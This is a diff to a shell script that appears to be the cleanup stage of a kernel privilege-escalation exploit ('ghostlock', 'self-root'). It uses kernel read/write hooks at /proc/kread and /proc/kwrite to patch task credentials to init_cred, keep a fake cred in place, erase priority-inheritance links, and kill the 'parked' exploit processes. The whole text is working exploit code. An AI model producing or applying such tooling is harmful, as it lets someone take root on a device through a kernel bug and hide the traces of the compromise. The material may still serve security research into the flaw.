@@ -41,9 +41,41 @@ set -u
 APPLY=0
 [ "${1:-}" = "--apply" ] && { APPLY=1; shift; }
 
-GL_LOG=${GL_LOG:-/data/local/tmp/gl-w1/w1c-self.log}
+GL_DIR=${GL_DIR:-/data/local/tmp/gl-w1}
+GL_LOG=${GL_LOG:-$GL_DIR/w1c-self.log}
 T=${1:-}
 IC=${2:-}
+PID=${3:-}
+
+# Driver mode: with no explicit addresses, walk the receipts the parked processes
+# left in <home>/parked.d and clean each one in a fresh invocation.  There is one
+# park state per process -- the W1 process and the self-root process are two
+# independent parks, each with its own payload page and its own PI fields.
+# GL_ONE stops the recursion.
+if [ -z "$T" ] && [ -z "${GL_ONE:-}" ] && [ -d "$GL_DIR/parked.d" ]; then
+    found=0
+    failed=0
+    for f in "$GL_DIR"/parked.d/*; do
+        [ -f "$f" ] || continue
+        found=1
+        t=$(sed -n 's/^task=//p' "$f" | head -1)
+        i=$(sed -n 's/^init_cred=//p' "$f" | head -1)
+        p=$(sed -n 's/^pid=//p' "$f" | head -1)
+        echo "=== parked receipt $f"
+        if [ "$APPLY" = 1 ]; then
+            GL_ONE=1 sh "$0" --apply "$t" "$i" "$p" || failed=1
+        else
+            GL_ONE=1 sh "$0" "$t" "$i" "$p" || failed=1
+        fi
+    done
+    if [ "$found" != 1 ]; then
+        echo "no receipts in $GL_DIR/parked.d"
+    elif [ "$failed" = 1 ]; then
+        echo "RESULT: at least one park state is NOT clean -- leave those processes alone"
+        exit 1
+    fi
+    exit 0
+fi
 
 if [ ! -r /proc/kread ] || [ ! -w /proc/kwrite ]; then
     echo "kread_min is not loaded: /proc/kread and /proc/kwrite must exist"
@@ -234,14 +266,13 @@ kw "$IC" "04000000000000000000000000000000"
 # only restore the creds if they actually point at init_cred (i.e. the write
 # landed); otherwise leave the backup alone -- rewriting the same values is
 # harmless, rewriting a *different* cred pointer you did not expect is not.
-# Restore the creds, but only from a backup that actually read back as a pair of
-# 64-bit values: a failed kread would otherwise turn into writing 16 zero bytes
-# into task->cred and crash the machine.
-if hexok "$RC_SAVE" && hexok "$CR_SAVE"; then
-    kw "$(addoff "$T" 0x790)" "$(le "$RC_SAVE")$(le "$CR_SAVE")"
-else
-    echo "SKIP cred restore: backup read back as '0x$RC_SAVE' / '0x$CR_SAVE'"
-fi
+# The creds are deliberately NOT restored: ghostlock has no arbitrary read, so
+# there is no "original value" to write back, and a failed backup read must never
+# turn into writing 16 zero bytes into task->cred.  Once the PI links below are
+# erased, the exit path is clean and the process is killed -- exit_creds then
+# puts the fake cred twice against its large usage counter (which never reaches
+# zero), and the payload page is released with nobody pointing at it.
+[ -n "$RC_SAVE" ] && echo "cred backup (informational): 0x$RC_SAVE 0x$CR_SAVE"
 
 # ----------------------------------------------------------------- verify ----
 PS_NEXT=$(kr "$(addoff "$T" 0x9a0)" 8)
@@ -270,7 +301,16 @@ case "$PW_BLOCKED" in *[!0]*) ok=0 ;; esac
 case "$IC0" in 04000000000000000000000000000000*) ;; *) ok=0 ;; esac
 
 if [ "$ok" = 1 ]; then
-    echo "RESULT: clean -- the parked process may now exit (or be killed)."
+    echo "RESULT: clean -- the park state is gone, the process may die now."
+    if [ -n "$PID" ]; then
+        if kill -9 "$PID" 2>/dev/null; then
+            echo "killed parked pid=$PID"
+        else
+            echo "kill -9 $PID failed (already gone?)"
+        fi
+    else
+        echo "no pid in this invocation; kill the parked process yourself"
+    fi
 else
     echo "RESULT: NOT clean -- do NOT let the parked process exit; re-check the"
     echo "        fields above (a failed kread shows as a short/empty value)."
